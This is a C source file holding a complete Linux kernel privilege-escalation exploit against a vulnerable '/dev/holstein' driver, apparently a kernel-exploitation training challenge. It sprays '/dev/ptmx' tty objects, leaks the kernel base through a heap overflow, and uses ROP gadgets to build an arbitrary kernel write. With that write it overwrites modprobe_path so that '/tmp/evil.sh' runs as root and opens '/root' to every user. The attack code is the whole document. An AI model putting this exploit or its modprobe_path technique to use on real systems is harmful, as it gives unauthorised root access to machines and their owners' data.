#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

#define MODPROBE_PATH 0xffffffff81e38180

//0xffffffff810a23c3 : mov dword ptr [rcx], eax ; ret
//0xffffffff81018a68 : mov dword ptr [rdx], eax ; ret
//0xffffffff8101083d : mov dword ptr [rdx], ecx ; ret
//0xffffffff8118a285 : mov eax, dword ptr [rdx] ; ret 

long long user_cs, user_ss, user_rflags, user_sp;
int fd, spray[100];
char buf[0x500];
long long g_buf = 0, kbase = 0;

void AAW32(long long addr, unsigned int val) {
	long long* p = (long long*)&buf;
	//0xffffffff8101083d : mov dword ptr [rdx], ecx ; ret
	p[12] = 0xffffffff8101083d;

	*(long long*)&buf[0x418] = g_buf;
	write(fd, buf, 0x500);

	for (int i = 0; i < 100; i++) {
		ioctl(spray[i], val, addr);
	}
}

int main() {
	// Heap spray
	for (int i = 0; i < 50; i++) {
		spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (spray[i] == -1)
			perror("/dev/ptmx");
	}

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1)
		perror("/dev/holstein");

	// Heap spray
	for (int i = 50; i < 100; i++) {
		spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (spray[i] == -1)
			perror("/dev/ptmx");
	}

	memset(buf, 0, 0x500);
	read(fd, buf, 0x500);

	// Leak kbase and g_buf
	kbase = *(long long*)&buf[0x418] - 0xc38880;
	g_buf = *(long long*)&buf[0x438] - 0x438;

	printf("[+] bufed base at 0x%llx\n", kbase);
	printf("[+] bufed g_buf at 0x%llx\n", g_buf);

	// Overwrite modprobepath
	char cmd[] = "/tmp/evil.sh";
	for (int i = 0; i < sizeof(cmd); i++) {
		AAW32(MODPROBE_PATH + i, *(unsigned int*)&cmd[i]);
	}

	// Prepare modprobe binary
	system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
	system("chmod +x /tmp/evil.sh");
	system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
	system("chmod +x /tmp/pwn");
	system("/tmp/pwn"); // modprobe_path

	close(fd);

	return 0;
}
